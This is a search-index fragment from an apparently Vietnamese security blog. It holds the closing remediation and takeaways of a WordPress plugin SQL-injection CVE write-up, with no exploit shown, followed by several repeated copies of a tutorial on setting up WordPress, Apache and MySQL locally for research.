v1.1.5.7 hoặc mới hơn ","date":"2025-09-21","objectID":"/vi/posts/2025-09-21-cve-2025-39566/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/vi/posts/2025-09-21-cve-2025-39566/#remediation"},{"categories":["CVE Analyst"],"collections":null,"content":"Takeaways\rsanitize_text_field() ≠ chống SQL Injection Cần phân biệt rõ: lọc input cho HTML vs cho SQL ","date":"2025-09-21","objectID":"/vi/posts/2025-09-21-cve-2025-39566/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/vi/posts/2025-09-21-cve-2025-39566/#takeaways"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rSQL Injection Cheat Sheet – PortSwigger WordPress Hostel Plugin \u003c= 1.1.5.6 is vulnerable to SQL Injection - patchstack ","date":"2025-09-21","objectID":"/vi/posts/2025-09-21-cve-2025-39566/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/vi/posts/2025-09-21-cve-2025-39566/#references"},{"categories":["Web"],"collections":null,"content":"A powerful and the most popular content management system (CMS).","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/"},{"categories":["Web"],"collections":null,"content":"WordPress là một hệ thống quản lý nội dung (CMS) mạnh mẽ và phổ biến nhất cho phép bạn tạo, quản lý và tùy chỉnh các trang web và blog một cách dễ dàng. Nó là open-source CMS, được xây dựng trên PHP và sử dụng cơ sở dữ liệu MySQL hoặc Maria DB. Ra đời năm 2003, ban đầu chỉ để viết blog, sau đó phát triển thành nền tảng tạo website, cửa hàng online, diễn đàn, landing page… Hiện nay, hơn 40% website trên thế giới chạy bằng WordPress. Có 2 phiên bản WordPress: WordPress.com Dịch vụ hosting do Automattic cung cấp Bạn chỉ cần đăng ký tài khoản, không phải cài đặt Hạn chế tùy chỉnh, muốn nâng cao thì phải trả phí WordPress.org Mã nguồn mở, bạn tự tải về và cài đặt lên hosting/server riêng Tùy chỉnh toàn diện, có thể cài plugin, theme, viết code, tạo website theo ý mình ","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/:0:0","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/#"},{"categories":["Web"],"collections":null,"content":"Ecosystem\rCore: CMS chính Plugin: Một phần mềm bổ sung có thể được cài đặt trên trang web WordPress để mở rộng chức năng của nó và thêm các tính năng mới Themes: Một phần mềm bổ sung đại diện cho sự xuất hiện trực quan và bố cục của một trang web WordPress ","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/:1:0","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/#ecosystem"},{"categories":["Web"],"collections":null,"content":"Why WordPress Hacking?\rState of WordPress Security in 2024 ","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/:2:0","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/#why-wordpress-hacking"},{"categories":["Web"],"collections":null,"content":"Most Popular\rHiện tại hơn 40% website trên toàn thế giới chạy WordPress Nghĩa là hacker chỉ cần tìm ra một lỗ hổng phổ biến =\u003e có thể khai thác hàng triệu site cùng lúc Giống như “cá nhiều thì chài ở đó” ","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/:2:1","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/#most-popular"},{"categories":["Web"],"collections":null,"content":"Plugin and Theme\rWordPress Core đã được xem xét trong 1 thời gian dài bởi hàng ngàn developers và researchers. Kết quả là rất khó để kẻ tấn công có thể đột nhập vào Tuy nhiên, có hàng chục ngàn plugin và theme từ nhiều nguồn, chất lượng không đồng đều được sử dụng Nhiều plugin code bảo mật kém, không còn được cập nhật. Hacker chỉ cần scan plugin/theme để tìm version lỗi thời, rồi khai thác ","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/:2:2","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/#plugin-and-theme"},{"categories":["Web"],"collections":null,"content":"Setup WordPress for Hacking\rCó rất nhiều cách để setup WorkPress, tìm kiếm bằng Google có thể cung cấp nhiều bài viết về nó. Ở đây tôi sẽ setup trên máy ảo Ubuntu (22.04): Không ảnh hưởng đến các dịch vụ của máy thật WordPress tương đối nhẹ để sử dụng trên máy ảo ","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/:3:0","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/#setup-wordpress-for-hacking"},{"categories":["Web"],"collections":null,"content":"Install and configure WordPress\rInstall Dependencies\rCài toàn bộ stack cần thiết để chạy WordPress (web server + database + PHP + các extension quan trọng). sudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress\rTải và cài mã nguồn WordPress vào thư mục web. # Tạo folder để lưu trữ mã nguồn website sudo mkdir -p /srv/www # Đổi owner thành www-data, đây là user mặc định của Apache/Nginx để chạy web server # Khi Apache/NGINX khởi động, nó không chạy bằng root (nguy hiểm vì có toàn quyền hệ thống), mà sẽ drop xuống chạy dưới quyền www-data. sudo chown www-data: /srv/www # Tải gói WordPress mới nhất từ trang chính thức # Giải nén vao thưc mục /srv/www được tạo ở trên curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www Có thể tải phiên bản cụ thể bằng: curl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www Cài từ wordpress.org là cách chuẩn nhất và ít rủi ro: Ubuntu có sẵn package wordpress trong repo. Nhưng nó thường cũ hơn nhiều so với bản chính thức trên wordpress.org Cộng đồng WordPress chỉ hỗ trợ khi bạn dùng bản chính thức từ wordpress.org, vì nếu bạn gặp lỗi do package của Ubuntu thì họ không giải quyết được. {: .prompt-info } Configure Apache for WordPress\rTạo file /etc/apache2/sites-available/wordpress.conf cấu hình Apache cho WordPress: # Lắng nghe trên tất cả địa chỉ IP (*) tại port 80 (HTTP). \u003cVirtualHost *:80\u003e # Thư mục gốc của website (nơi chứa mã nguồn WordPress). DocumentRoot /srv/www/wordpress \u003cDirectory /srv/www/wordpress\u003e Options FollowSymLinks # Cho phép file .htaccess ghi đè một số thiết lập liên quan đến bảo mật và URL rewriting. AllowOverride Limit Options FileInfo # Khi truy cập thư mục, Apache sẽ tìm file index.php để hiển thị. DirectoryIndex index.php # Cho phép tất cả mọi người truy cập (cần cho website public). Require all granted \u003c/Directory\u003e # Riêng thư mục wp-content (chứa plugin, theme, upload) cũng cho phép truy cập. \u003cDirectory /srv/www/wordpress/wp-content\u003e Options FollowSymLinks Require all granted \u003c/Directory\u003e \u003c/VirtualHost\u003e Kích hoạt site WordPress: sudo a2ensite wordpress a2ensite = enable site config (tạo symlink từ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau đó site wordpress sẽ được Apache load khi restart. Kích hoạt module rewrite: sudo a2enmod rewrite WordPress cần module mod_rewrite để hỗ trợ Pretty Permalinks (ví dụ /blog/hello-world/ thay vì ?p=123) Vô hiệu hóa site mặc định (Option): sudo a2dissite 000-default Apache mặc định có site 000-default.conf (chỉ hiển thị “It works!”) Nếu không disable, site mặc định có thể chiếm port 80 trước WordPress 👉 Hoặc nếu không muốn disable, có thể thêm ServerName vào VirtualHost WordPress để Apache phân biệt domain. \u003cVirtualHost *:80\u003e ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u003c/VirtualHost\u003e Muốn chạy được thì phải cấu hình DNS hoặc sửa file hosts: Linux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache: sudo service apache2 reload Tải lại cấu hình mới mà không cần dừng server Configure database\rWordPress cần một cơ sở dữ liệu (MySQL/MariaDB) để lưu: Bài viết, trang, menu Người dùng, mật khẩu (hash) Cấu hình site Plugins, themes settings Mở MySQL với quyền root: sudo mysql -u root Cấu hình MySQL: -- Tạo database wordpress mysql\u003e CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- Tạo user riêng cho wordpress mysql\u003e CREATE USER wordpress@localhost IDENTIFIED BY '\u003cyour-password\u003e'; Query OK, 1 row affected (0,00 sec) -- Cấp quyền cho user WordPress mysql\u003e GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- Làm mới lại quyền mysql\u003e FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Thoát mysql\u003e quit Bye Khởi động lại dịch vụ: sudo service mysql start Configure WordP","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/:3:1","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/#install-and-configure-wordpress"},{"categories":["Web"],"collections":null,"content":"Install and configure WordPress\rInstall Dependencies\rCài toàn bộ stack cần thiết để chạy WordPress (web server + database + PHP + các extension quan trọng). sudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress\rTải và cài mã nguồn WordPress vào thư mục web. # Tạo folder để lưu trữ mã nguồn website sudo mkdir -p /srv/www # Đổi owner thành www-data, đây là user mặc định của Apache/Nginx để chạy web server # Khi Apache/NGINX khởi động, nó không chạy bằng root (nguy hiểm vì có toàn quyền hệ thống), mà sẽ drop xuống chạy dưới quyền www-data. sudo chown www-data: /srv/www # Tải gói WordPress mới nhất từ trang chính thức # Giải nén vao thưc mục /srv/www được tạo ở trên curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www Có thể tải phiên bản cụ thể bằng: curl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www Cài từ wordpress.org là cách chuẩn nhất và ít rủi ro: Ubuntu có sẵn package wordpress trong repo. Nhưng nó thường cũ hơn nhiều so với bản chính thức trên wordpress.org Cộng đồng WordPress chỉ hỗ trợ khi bạn dùng bản chính thức từ wordpress.org, vì nếu bạn gặp lỗi do package của Ubuntu thì họ không giải quyết được. {: .prompt-info } Configure Apache for WordPress\rTạo file /etc/apache2/sites-available/wordpress.conf cấu hình Apache cho WordPress: # Lắng nghe trên tất cả địa chỉ IP (*) tại port 80 (HTTP). # Thư mục gốc của website (nơi chứa mã nguồn WordPress). DocumentRoot /srv/www/wordpress Options FollowSymLinks # Cho phép file .htaccess ghi đè một số thiết lập liên quan đến bảo mật và URL rewriting. AllowOverride Limit Options FileInfo # Khi truy cập thư mục, Apache sẽ tìm file index.php để hiển thị. DirectoryIndex index.php # Cho phép tất cả mọi người truy cập (cần cho website public). Require all granted # Riêng thư mục wp-content (chứa plugin, theme, upload) cũng cho phép truy cập. Options FollowSymLinks Require all granted Kích hoạt site WordPress: sudo a2ensite wordpress a2ensite = enable site config (tạo symlink từ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau đó site wordpress sẽ được Apache load khi restart. Kích hoạt module rewrite: sudo a2enmod rewrite WordPress cần module mod_rewrite để hỗ trợ Pretty Permalinks (ví dụ /blog/hello-world/ thay vì ?p=123) Vô hiệu hóa site mặc định (Option): sudo a2dissite 000-default Apache mặc định có site 000-default.conf (chỉ hiển thị “It works!”) Nếu không disable, site mặc định có thể chiếm port 80 trước WordPress 👉 Hoặc nếu không muốn disable, có thể thêm ServerName vào VirtualHost WordPress để Apache phân biệt domain. ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... Muốn chạy được thì phải cấu hình DNS hoặc sửa file hosts: Linux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache: sudo service apache2 reload Tải lại cấu hình mới mà không cần dừng server Configure database\rWordPress cần một cơ sở dữ liệu (MySQL/MariaDB) để lưu: Bài viết, trang, menu Người dùng, mật khẩu (hash) Cấu hình site Plugins, themes settings Mở MySQL với quyền root: sudo mysql -u root Cấu hình MySQL: -- Tạo database wordpress mysql\u003e CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- Tạo user riêng cho wordpress mysql\u003e CREATE USER wordpress@localhost IDENTIFIED BY ''; Query OK, 1 row affected (0,00 sec) -- Cấp quyền cho user WordPress mysql\u003e GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- Làm mới lại quyền mysql\u003e FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Thoát mysql\u003e quit Bye Khởi động lại dịch vụ: sudo service mysql start Configure WordP","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/:3:1","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/#install-dependencies"},{"categories":["Web"],"collections":null,"content":"Install and configure WordPress\rInstall Dependencies\rCài toàn bộ stack cần thiết để chạy WordPress (web server + database + PHP + các extension quan trọng). sudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress\rTải và cài mã nguồn WordPress vào thư mục web. # Tạo folder để lưu trữ mã nguồn website sudo mkdir -p /srv/www # Đổi owner thành www-data, đây là user mặc định của Apache/Nginx để chạy web server # Khi Apache/NGINX khởi động, nó không chạy bằng root (nguy hiểm vì có toàn quyền hệ thống), mà sẽ drop xuống chạy dưới quyền www-data. sudo chown www-data: /srv/www # Tải gói WordPress mới nhất từ trang chính thức # Giải nén vao thưc mục /srv/www được tạo ở trên curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www Có thể tải phiên bản cụ thể bằng: curl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www Cài từ wordpress.org là cách chuẩn nhất và ít rủi ro: Ubuntu có sẵn package wordpress trong repo. Nhưng nó thường cũ hơn nhiều so với bản chính thức trên wordpress.org Cộng đồng WordPress chỉ hỗ trợ khi bạn dùng bản chính thức từ wordpress.org, vì nếu bạn gặp lỗi do package của Ubuntu thì họ không giải quyết được. {: .prompt-info } Configure Apache for WordPress\rTạo file /etc/apache2/sites-available/wordpress.conf cấu hình Apache cho WordPress: # Lắng nghe trên tất cả địa chỉ IP (*) tại port 80 (HTTP). # Thư mục gốc của website (nơi chứa mã nguồn WordPress). DocumentRoot /srv/www/wordpress Options FollowSymLinks # Cho phép file .htaccess ghi đè một số thiết lập liên quan đến bảo mật và URL rewriting. AllowOverride Limit Options FileInfo # Khi truy cập thư mục, Apache sẽ tìm file index.php để hiển thị. DirectoryIndex index.php # Cho phép tất cả mọi người truy cập (cần cho website public). Require all granted # Riêng thư mục wp-content (chứa plugin, theme, upload) cũng cho phép truy cập. Options FollowSymLinks Require all granted Kích hoạt site WordPress: sudo a2ensite wordpress a2ensite = enable site config (tạo symlink từ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau đó site wordpress sẽ được Apache load khi restart. Kích hoạt module rewrite: sudo a2enmod rewrite WordPress cần module mod_rewrite để hỗ trợ Pretty Permalinks (ví dụ /blog/hello-world/ thay vì ?p=123) Vô hiệu hóa site mặc định (Option): sudo a2dissite 000-default Apache mặc định có site 000-default.conf (chỉ hiển thị “It works!”) Nếu không disable, site mặc định có thể chiếm port 80 trước WordPress 👉 Hoặc nếu không muốn disable, có thể thêm ServerName vào VirtualHost WordPress để Apache phân biệt domain. ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... Muốn chạy được thì phải cấu hình DNS hoặc sửa file hosts: Linux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache: sudo service apache2 reload Tải lại cấu hình mới mà không cần dừng server Configure database\rWordPress cần một cơ sở dữ liệu (MySQL/MariaDB) để lưu: Bài viết, trang, menu Người dùng, mật khẩu (hash) Cấu hình site Plugins, themes settings Mở MySQL với quyền root: sudo mysql -u root Cấu hình MySQL: -- Tạo database wordpress mysql\u003e CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- Tạo user riêng cho wordpress mysql\u003e CREATE USER wordpress@localhost IDENTIFIED BY ''; Query OK, 1 row affected (0,00 sec) -- Cấp quyền cho user WordPress mysql\u003e GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- Làm mới lại quyền mysql\u003e FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Thoát mysql\u003e quit Bye Khởi động lại dịch vụ: sudo service mysql start Configure WordP","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/:3:1","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/#install-wordpress"},{"categories":["Web"],"collections":null,"content":"Install and configure WordPress\rInstall Dependencies\rCài toàn bộ stack cần thiết để chạy WordPress (web server + database + PHP + các extension quan trọng). sudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress\rTải và cài mã nguồn WordPress vào thư mục web. # Tạo folder để lưu trữ mã nguồn website sudo mkdir -p /srv/www # Đổi owner thành www-data, đây là user mặc định của Apache/Nginx để chạy web server # Khi Apache/NGINX khởi động, nó không chạy bằng root (nguy hiểm vì có toàn quyền hệ thống), mà sẽ drop xuống chạy dưới quyền www-data. sudo chown www-data: /srv/www # Tải gói WordPress mới nhất từ trang chính thức # Giải nén vao thưc mục /srv/www được tạo ở trên curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www Có thể tải phiên bản cụ thể bằng: curl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www Cài từ wordpress.org là cách chuẩn nhất và ít rủi ro: Ubuntu có sẵn package wordpress trong repo. Nhưng nó thường cũ hơn nhiều so với bản chính thức trên wordpress.org Cộng đồng WordPress chỉ hỗ trợ khi bạn dùng bản chính thức từ wordpress.org, vì nếu bạn gặp lỗi do package của Ubuntu thì họ không giải quyết được. {: .prompt-info } Configure Apache for WordPress\rTạo file /etc/apache2/sites-available/wordpress.conf cấu hình Apache cho WordPress: # Lắng nghe trên tất cả địa chỉ IP (*) tại port 80 (HTTP). # Thư mục gốc của website (nơi chứa mã nguồn WordPress). DocumentRoot /srv/www/wordpress Options FollowSymLinks # Cho phép file .htaccess ghi đè một số thiết lập liên quan đến bảo mật và URL rewriting. AllowOverride Limit Options FileInfo # Khi truy cập thư mục, Apache sẽ tìm file index.php để hiển thị. DirectoryIndex index.php # Cho phép tất cả mọi người truy cập (cần cho website public). Require all granted # Riêng thư mục wp-content (chứa plugin, theme, upload) cũng cho phép truy cập. Options FollowSymLinks Require all granted Kích hoạt site WordPress: sudo a2ensite wordpress a2ensite = enable site config (tạo symlink từ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau đó site wordpress sẽ được Apache load khi restart. Kích hoạt module rewrite: sudo a2enmod rewrite WordPress cần module mod_rewrite để hỗ trợ Pretty Permalinks (ví dụ /blog/hello-world/ thay vì ?p=123) Vô hiệu hóa site mặc định (Option): sudo a2dissite 000-default Apache mặc định có site 000-default.conf (chỉ hiển thị “It works!”) Nếu không disable, site mặc định có thể chiếm port 80 trước WordPress 👉 Hoặc nếu không muốn disable, có thể thêm ServerName vào VirtualHost WordPress để Apache phân biệt domain. ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... Muốn chạy được thì phải cấu hình DNS hoặc sửa file hosts: Linux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache: sudo service apache2 reload Tải lại cấu hình mới mà không cần dừng server Configure database\rWordPress cần một cơ sở dữ liệu (MySQL/MariaDB) để lưu: Bài viết, trang, menu Người dùng, mật khẩu (hash) Cấu hình site Plugins, themes settings Mở MySQL với quyền root: sudo mysql -u root Cấu hình MySQL: -- Tạo database wordpress mysql\u003e CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- Tạo user riêng cho wordpress mysql\u003e CREATE USER wordpress@localhost IDENTIFIED BY ''; Query OK, 1 row affected (0,00 sec) -- Cấp quyền cho user WordPress mysql\u003e GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- Làm mới lại quyền mysql\u003e FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Thoát mysql\u003e quit Bye Khởi động lại dịch vụ: sudo service mysql start Configure WordP","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/:3:1","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/#configure-apache-for-wordpress"},{"categories":["Web"],"collections":null,"content":"Install and configure WordPress\rInstall Dependencies\rCài toàn bộ stack cần thiết để chạy WordPress (web server + database + PHP + các extension quan trọng). sudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress\rTải và cài mã nguồn WordPress vào thư mục web. # Tạo folder để lưu trữ mã nguồn website sudo mkdir -p /srv/www # Đổi owner thành www-data, đây là user mặc định của Apache/Nginx để chạy web server # Khi Apache/NGINX khởi động, nó không chạy bằng root (nguy hiểm vì có toàn quyền hệ thống), mà sẽ drop xuống chạy dưới quyền www-data. sudo chown www-data: /srv/www # Tải gói WordPress mới nhất từ trang chính thức # Giải nén vao thưc mục /srv/www được tạo ở trên curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www Có thể tải phiên bản cụ thể bằng: curl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www Cài từ wordpress.org là cách chuẩn nhất và ít rủi ro: Ubuntu có sẵn package wordpress trong repo. Nhưng nó thường cũ hơn nhiều so với bản chính thức trên wordpress.org Cộng đồng WordPress chỉ hỗ trợ khi bạn dùng bản chính thức từ wordpress.org, vì nếu bạn gặp lỗi do package của Ubuntu thì họ không giải quyết được. {: .prompt-info } Configure Apache for WordPress\rTạo file /etc/apache2/sites-available/wordpress.conf cấu hình Apache cho WordPress: # Lắng nghe trên tất cả địa chỉ IP (*) tại port 80 (HTTP). # Thư mục gốc của website (nơi chứa mã nguồn WordPress). DocumentRoot /srv/www/wordpress Options FollowSymLinks # Cho phép file .htaccess ghi đè một số thiết lập liên quan đến bảo mật và URL rewriting. AllowOverride Limit Options FileInfo # Khi truy cập thư mục, Apache sẽ tìm file index.php để hiển thị. DirectoryIndex index.php # Cho phép tất cả mọi người truy cập (cần cho website public). Require all granted # Riêng thư mục wp-content (chứa plugin, theme, upload) cũng cho phép truy cập. Options FollowSymLinks Require all granted Kích hoạt site WordPress: sudo a2ensite wordpress a2ensite = enable site config (tạo symlink từ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau đó site wordpress sẽ được Apache load khi restart. Kích hoạt module rewrite: sudo a2enmod rewrite WordPress cần module mod_rewrite để hỗ trợ Pretty Permalinks (ví dụ /blog/hello-world/ thay vì ?p=123) Vô hiệu hóa site mặc định (Option): sudo a2dissite 000-default Apache mặc định có site 000-default.conf (chỉ hiển thị “It works!”) Nếu không disable, site mặc định có thể chiếm port 80 trước WordPress 👉 Hoặc nếu không muốn disable, có thể thêm ServerName vào VirtualHost WordPress để Apache phân biệt domain. ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... Muốn chạy được thì phải cấu hình DNS hoặc sửa file hosts: Linux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache: sudo service apache2 reload Tải lại cấu hình mới mà không cần dừng server Configure database\rWordPress cần một cơ sở dữ liệu (MySQL/MariaDB) để lưu: Bài viết, trang, menu Người dùng, mật khẩu (hash) Cấu hình site Plugins, themes settings Mở MySQL với quyền root: sudo mysql -u root Cấu hình MySQL: -- Tạo database wordpress mysql\u003e CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- Tạo user riêng cho wordpress mysql\u003e CREATE USER wordpress@localhost IDENTIFIED BY ''; Query OK, 1 row affected (0,00 sec) -- Cấp quyền cho user WordPress mysql\u003e GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- Làm mới lại quyền mysql\u003e FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Thoát mysql\u003e quit Bye Khởi động lại dịch vụ: sudo service mysql start Configure WordP","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/:3:1","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/#configure-database"},{"categories":["Web"],"collections":null,"content":"Install and configure WordPress\rInstall Dependencies\rCài toàn bộ stack cần thiết để chạy WordPress (web server + database + PHP + các extension quan trọng). sudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress\rTải và cài mã nguồn WordPress vào thư mục web. # Tạo folder để lưu trữ mã nguồn website sudo mkdir -p /srv/www # Đổi owner thành www-data, đây là user mặc định của Apache/Nginx để chạy web server # Khi Apache/NGINX khởi động, nó không chạy bằng root (nguy hiểm vì có toàn quyền hệ thống), mà sẽ drop xuống chạy dưới quyền www-data. sudo chown www-data: /srv/www # Tải gói WordPress mới nhất từ trang chính thức # Giải nén vao thưc mục /srv/www được tạo ở trên curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www Có thể tải phiên bản cụ thể bằng: curl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www Cài từ wordpress.org là cách chuẩn nhất và ít rủi ro: Ubuntu có sẵn package wordpress trong repo. Nhưng nó thường cũ hơn nhiều so với bản chính thức trên wordpress.org Cộng đồng WordPress chỉ hỗ trợ khi bạn dùng bản chính thức từ wordpress.org, vì nếu bạn gặp lỗi do package của Ubuntu thì họ không giải quyết được. {: .prompt-info } Configure Apache for WordPress\rTạo file /etc/apache2/sites-available/wordpress.conf cấu hình Apache cho WordPress: # Lắng nghe trên tất cả địa chỉ IP (*) tại port 80 (HTTP). # Thư mục gốc của website (nơi chứa mã nguồn WordPress). DocumentRoot /srv/www/wordpress Options FollowSymLinks # Cho phép file .htaccess ghi đè một số thiết lập liên quan đến bảo mật và URL rewriting. AllowOverride Limit Options FileInfo # Khi truy cập thư mục, Apache sẽ tìm file index.php để hiển thị. DirectoryIndex index.php # Cho phép tất cả mọi người truy cập (cần cho website public). Require all granted # Riêng thư mục wp-content (chứa plugin, theme, upload) cũng cho phép truy cập. Options FollowSymLinks Require all granted Kích hoạt site WordPress: sudo a2ensite wordpress a2ensite = enable site config (tạo symlink từ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau đó site wordpress sẽ được Apache load khi restart. Kích hoạt module rewrite: sudo a2enmod rewrite WordPress cần module mod_rewrite để hỗ trợ Pretty Permalinks (ví dụ /blog/hello-world/ thay vì ?p=123) Vô hiệu hóa site mặc định (Option): sudo a2dissite 000-default Apache mặc định có site 000-default.conf (chỉ hiển thị “It works!”) Nếu không disable, site mặc định có thể chiếm port 80 trước WordPress 👉 Hoặc nếu không muốn disable, có thể thêm ServerName vào VirtualHost WordPress để Apache phân biệt domain. ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... Muốn chạy được thì phải cấu hình DNS hoặc sửa file hosts: Linux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache: sudo service apache2 reload Tải lại cấu hình mới mà không cần dừng server Configure database\rWordPress cần một cơ sở dữ liệu (MySQL/MariaDB) để lưu: Bài viết, trang, menu Người dùng, mật khẩu (hash) Cấu hình site Plugins, themes settings Mở MySQL với quyền root: sudo mysql -u root Cấu hình MySQL: -- Tạo database wordpress mysql\u003e CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- Tạo user riêng cho wordpress mysql\u003e CREATE USER wordpress@localhost IDENTIFIED BY ''; Query OK, 1 row affected (0,00 sec) -- Cấp quyền cho user WordPress mysql\u003e GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- Làm mới lại quyền 